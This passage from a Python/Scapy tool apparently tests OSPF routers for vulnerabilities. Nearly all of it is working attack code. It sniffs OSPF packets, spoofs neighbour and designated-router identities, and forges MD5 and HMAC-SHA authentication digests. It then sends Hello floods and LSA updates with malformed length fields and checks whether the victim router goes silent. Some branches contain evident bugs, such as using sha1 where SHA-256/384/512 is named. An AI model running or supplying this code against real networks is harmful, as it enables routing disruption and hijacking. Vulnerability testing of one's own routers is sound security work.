			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			
			#################################2ND PASS###############################################
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			pkts_atk2[lenpkts2][OSPF_Hdr].seq +=100 #<<<auth crypt sequence
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			ospf_header_nov4 = pkts_atk2[lenpkts2][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[lenpkts2][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk2[lenpkts2])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			chkvuln()
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :	
			#print("2sha256activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			
			#################################2ND PASS###############################################
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			pkts_atk2[lenpkts2][OSPF_Hdr].seq +=100 #<<<auth crypt sequence
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			ospf_header_nov4 = pkts_atk2[lenpkts2][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[lenpkts2][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(8))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha256()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha256()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk2[lenpkts2])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha384" :	
			#print("2sha384activate")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			
			#################################2ND PASS###############################################
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			pkts_atk2[lenpkts2][OSPF_Hdr].seq +=100 #<<<auth crypt sequence
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			ospf_header_nov4 = pkts_atk2[lenpkts2][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[lenpkts2][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(12))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha384()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha384()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk2[lenpkts2])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			chkvuln()
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha512" :	
			#print("debug_2sha512")
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts]))
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			
			#################################2ND PASS###############################################
			print("2nd pass in 20 second")
			def stopfilter2(x):
				if x[IP].src == NEW_DR_IP_input :
					return True
				else:
					return False
			pkts_atk2=sniff(filter="ip proto 0x59", stop_filter = stopfilter2, timeout = 20)
			lenpkts2 = len(pkts_atk2)-1
			
			pkts_atk2[lenpkts2][OSPF_Hello].router = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].src = NEW_DR_IP_input
			pkts_atk2[lenpkts2][IP].dst = BDRouter
			pkts_atk2[lenpkts2][OSPF_Hello].prio = 255
			pkts_atk2[lenpkts2][OSPF_Hdr].seq +=100 #<<<auth crypt sequence
			del pkts_atk2[lenpkts2].chksum
			del pkts_atk2[lenpkts2][OSPF_Hdr].chksum
			pkts_atk2[lenpkts2] = pkts_atk2[lenpkts2].__class__(str(pkts_atk2[lenpkts2]))
			ospf_header_nov4 = pkts_atk2[lenpkts2][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk2[lenpkts2][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(128))
			o_pad = ('\x5c'*(128))
			aa_pad = ('878fe1f3'*(16))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha512()
			genhash1.update(hash_sum_1)
			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha512()
			genhash2.update(hash_sum_2)
			pkts_new = str(pkts_atk2[lenpkts2])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			sendp(pkts_new)
			time.sleep(20)
			chkvuln()
		time.sleep(5)
		main()
		Attacks()
	def Eight_ManyHello_attack(): #Done (wait for testing)
		print("")
		load_contrib('ospf')
		print("This test does not support LLS block, please disable in the router interface before perform the test")
		print("Intercepting Hello, this will take only few seconds")
		
		def chkvuln(victimIP):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			FFb=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][IP].src == victimIP:
						print "Hello received, not vulnerable for Sending large number of neighbor announcement Attack"
						sta8 = "     Hello received, not vulnerable for Sending large number of neighbor announcement Attack"
						FFb=True
						break;
				except IndexError:
					FFb=False
					continue
			if FFb != True:		
				print('No Hello received, vulnerable for Sending large number of neighbor announcement Attack')
				sta8 = "     No Hello received, vulnerable for Sending large number of neighbor announcement Attack"
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 1: #to select Hello packet
				return True
			else:
				return False
		pkts_sniff=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for Hello packet
		
		lenpkts = len(pkts_sniff)-1
		pkts_atk = pkts_sniff[lenpkts]
		counter=0
		seqnumber=100
		print ("\n")
		
		if get_authtype(pkts_atk) == "0_no":
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				sendp(pkts_atk, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)

		elif get_authtype(pkts_atk) == "1_plain":
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				sendp(pkts_atk, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)
			
		elif get_authtype(pkts_atk) == "2_md":
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				
				ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
				ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
				#print key_padd
				ospf_header_combine = ospf_header_cuthash + key_padd
				genhash = hashlib.md5()
				genhash.update(ospf_header_combine)
				pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
				pkts_new = pkts_new.__class__(str(pkts_new))
			
				sendp(pkts_new, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)
		
		elif get_authtype(pkts_atk) == "2_sha1":
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				
				ospf_header_nov4 = pkts_atk[OSPF_Hdr] #cut ipv4 header out
				ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[OSPF_Hdr].len]
					
				i_pad = ('\x36'*(64))
				o_pad = ('\x5c'*(64))
				aa_pad = ('878fe1f3'*(5))
				a_pad = (aa_pad.decode('hex'))
				def xor_strings(xs, ys):
					return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
				i_key_pad = xor_strings(key_padd,i_pad)
				o_key_pad = xor_strings(key_padd,o_pad)
					
				hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
				genhash1 = hashlib.sha1()
				genhash1.update(hash_sum_1)
				hash_sum_2 = o_key_pad + genhash1.digest()
				genhash2 = hashlib.sha1()
				genhash2.update(hash_sum_2)
				pkts_new = str(pkts_atk)[:34] + ospf_header_cuthash + genhash2.digest()
				pkts_new = pkts_new.__class__(str(pkts_new))
				sendp(pkts_new, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)
			
		elif get_authtype(pkts_atk) == "2_sha256":	
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				
				ospf_header_nov4 = pkts_atk[OSPF_Hdr] #cut ipv4 header out
				ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[OSPF_Hdr].len]
					
				i_pad = ('\x36'*(64))
				o_pad = ('\x5c'*(64))
				aa_pad = ('878fe1f3'*(8))
				a_pad = (aa_pad.decode('hex'))
				def xor_strings(xs, ys):
					return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
				i_key_pad = xor_strings(key_padd,i_pad)
				o_key_pad = xor_strings(key_padd,o_pad)
					
				hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
				genhash1 = hashlib.sha1()
				genhash1.update(hash_sum_1)
				hash_sum_2 = o_key_pad + genhash1.digest()
				genhash2 = hashlib.sha1()
				genhash2.update(hash_sum_2)
				pkts_new = str(pkts_atk)[:34] + ospf_header_cuthash + genhash2.digest()
				pkts_new = pkts_new.__class__(str(pkts_new))
				sendp(pkts_new, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)
			
		elif get_authtype(pkts_atk) == "2_sha384":
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				
				ospf_header_nov4 = pkts_atk[OSPF_Hdr] #cut ipv4 header out
				ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[OSPF_Hdr].len]
					
				i_pad = ('\x36'*(128))
				o_pad = ('\x5c'*(128))
				aa_pad = ('878fe1f3'*(12))
				a_pad = (aa_pad.decode('hex'))
				def xor_strings(xs, ys):
					return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
				i_key_pad = xor_strings(key_padd,i_pad)
				o_key_pad = xor_strings(key_padd,o_pad)
					
				hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
				genhash1 = hashlib.sha1()
				genhash1.update(hash_sum_1)
				hash_sum_2 = o_key_pad + genhash1.digest()
				genhash2 = hashlib.sha1()
				genhash2.update(hash_sum_2)
				pkts_new = str(pkts_atk)[:34] + ospf_header_cuthash + genhash2.digest()
				pkts_new = pkts_new.__class__(str(pkts_new))
				sendp(pkts_new, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)
			
		elif get_authtype(pkts_atk) == "2_sha512":
			point = "."
			thirdpoint= [pos for pos, char in enumerate(pkts_atk[IP].src) if char == point]
			thirdpoint = int(thirdpoint[2])+1 #<< find the forth octet
			for i in range(0,255):
				host = pkts_atk[IP].src[0:thirdpoint] + str(i)
				pkts_atk[IP].src =host
				pkts_atk[IP].chksum=None
				pkts_atk[OSPF_Hdr].src = host
				pkts_atk[OSPF_Hdr].chksum=None
				pkts_atk[OSPF_Hello].router = host
				pkts_atk.chksum=None
				
				ospf_header_nov4 = pkts_atk[OSPF_Hdr] #cut ipv4 header out
				ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[OSPF_Hdr].len]
					
				i_pad = ('\x36'*(128))
				o_pad = ('\x5c'*(128))
				aa_pad = ('878fe1f3'*(16))
				a_pad = (aa_pad.decode('hex'))
				def xor_strings(xs, ys):
					return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))
				i_key_pad = xor_strings(key_padd,i_pad)
				o_key_pad = xor_strings(key_padd,o_pad)
					
				hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
				genhash1 = hashlib.sha1()
				genhash1.update(hash_sum_1)
				hash_sum_2 = o_key_pad + genhash1.digest()
				genhash2 = hashlib.sha1()
				genhash2.update(hash_sum_2)
				pkts_new = str(pkts_atk)[:34] + ospf_header_cuthash + genhash2.digest()
				pkts_new = pkts_new.__class__(str(pkts_new))
				sendp(pkts_new, verbose=1)
				counter+=1
			print("Total Hello packet sent = ") + "%s" %(counter) 
			print("Checking for Vulnerability")
			chkvuln(pkts_atk[OSPF_Hello].backup)
		time.sleep(5)
		main()
		Attacks()	
	def Nine_InvalidLength_attack(selnine): #Done (wait for testing)
		print("")
		load_contrib('ospf')
		print("Intercepting OSPF's LSU. Please wait, this may take up to 30 minutes")
		
		def stopfilter(x):
			if x[OSPF_Hdr].type == 4 and "OSPF_Router_LSA" in x : #to select only packet with Router_LSA not Network-LSA 
				return True
			else:
				return False
		pkts_atk=sniff(filter="ip proto 0x59", stop_filter=stopfilter) #sniff for LSUpdate
		
		def chkvuln(srcIP):
			pkts_chk=sniff(filter="ip proto 0x59", timeout = 20)
			FFb=False
			for index in range(len(pkts_chk)): 
				try: 
					if pkts_chk[index][IP].src == srcIP:
						print "Hello received, not vulnerable for Sending LSA-update with crafted length fields Attack"
						sta9 = "     Hello received, not vulnerable for Sending LSA-update with crafted length fields Attack"
						FFb=True
						break;
				except IndexError:
					FFb=False
					continue
			if FFb != True:		
				print('No Hello received, vulnerable for Sending LSA-update with crafted length fields Attack')
				sta9 = "     No Hello received, vulnerable for Sending LSA-update with crafted length fields Attack"
		
		lenpkts = len(pkts_atk)-1 #to select the last packet captured from sniffed
		
		if get_authtype(pkts_atk[lenpkts]) == "0_no" :
			srcIP = pkts_atk[lenpkts][IP].src #victimIP
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = pkts_atk[lenpkts][OSPF_Router_LSA].len+10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = pkts_atk[lenpkts][OSPF_Router_LSA].len+10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			print("sending packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
		
		elif get_authtype(pkts_atk[lenpkts]) == "1_plain" :
			srcIP = pkts_atk[lenpkts][IP].src
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len -= 10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len += 10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			print("sending packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_atk[lenpkts], verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
			
		elif get_authtype(pkts_atk[lenpkts]) == "2_md" :
			srcIP = pkts_atk[lenpkts][IP].src
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len -= 10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len += 10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #cut out hash
			ospf_header_combine = ospf_header_cuthash + key_padd
			genhash = hashlib.md5()
			genhash.update(ospf_header_combine)
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash.digest() #obtain the Layer2,3 header
			pkts_new = pkts_new.__class__(str(pkts_new))
			
			print("sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha1" :
			srcIP = pkts_atk[lenpkts][IP].src
			pkts_atk[lenpkts][OSPF_Router_LSA].seq += 20
			pkts_atk[lenpkts][OSPF_Hdr].seq +=20 #<<<auth crypt sequence
			print("The IP address of victim router is: " + srcIP)
			#print(srcIP)
			if selnine == "9.1":
				pkts_atk[lenpkts][OSPF_Router_LSA].len = 0
			if selnine == "9.2":
				pkts_atk[lenpkts][OSPF_Router_LSA].len -= 10
			if selnine == "9.3":
				pkts_atk[lenpkts][OSPF_Router_LSA].len += 10
			del pkts_atk[lenpkts].chksum
			del pkts_atk[lenpkts][OSPF_Hdr].chksum
			del pkts_atk[lenpkts][OSPF_Hdr][OSPF_Router_LSA].chksum
			pkts_atk[lenpkts] = pkts_atk[lenpkts].__class__(str(pkts_atk[lenpkts])) #won't reset the len field
			
			ospf_header_nov4 = pkts_atk[lenpkts][OSPF_Hdr] #cut ipv4 header out
			ospf_header_cuthash = str(ospf_header_nov4)[:pkts_atk[lenpkts][OSPF_Hdr].len] #left only pure header, no auth hash at the back
			
			i_pad = ('\x36'*(64))
			o_pad = ('\x5c'*(64))
			aa_pad = ('878fe1f3'*(5))
			a_pad = (aa_pad.decode('hex'))
			
			def xor_strings(xs, ys):
				return "".join(chr(ord(x) ^ ord(y)) for x, y in zip(xs, ys))

			i_key_pad = xor_strings(key_padd,i_pad)
			o_key_pad = xor_strings(key_padd,o_pad)
			
			hash_sum_1 = i_key_pad + ospf_header_cuthash + a_pad
			genhash1 = hashlib.sha1()
			genhash1.update(hash_sum_1)

			hash_sum_2 = o_key_pad + genhash1.digest()
			genhash2 = hashlib.sha1()
			genhash2.update(hash_sum_2)
			
			pkts_new = str(pkts_atk[lenpkts])[:34] + ospf_header_cuthash + genhash2.digest()
			pkts_new = pkts_new.__class__(str(pkts_new))
			print ("\n")
			print("Sending forged packet in 10 seconds")
			time.sleep(10)
			sendp(pkts_new, verbose=1)
			print("checking for vulnerable, 20 seconds")
			chkvuln(srcIP)
		
		elif get_authtype(pkts_atk[lenpkts]) == "2_sha256" :
			srcIP = pkts_atk[lenpkts][IP].src
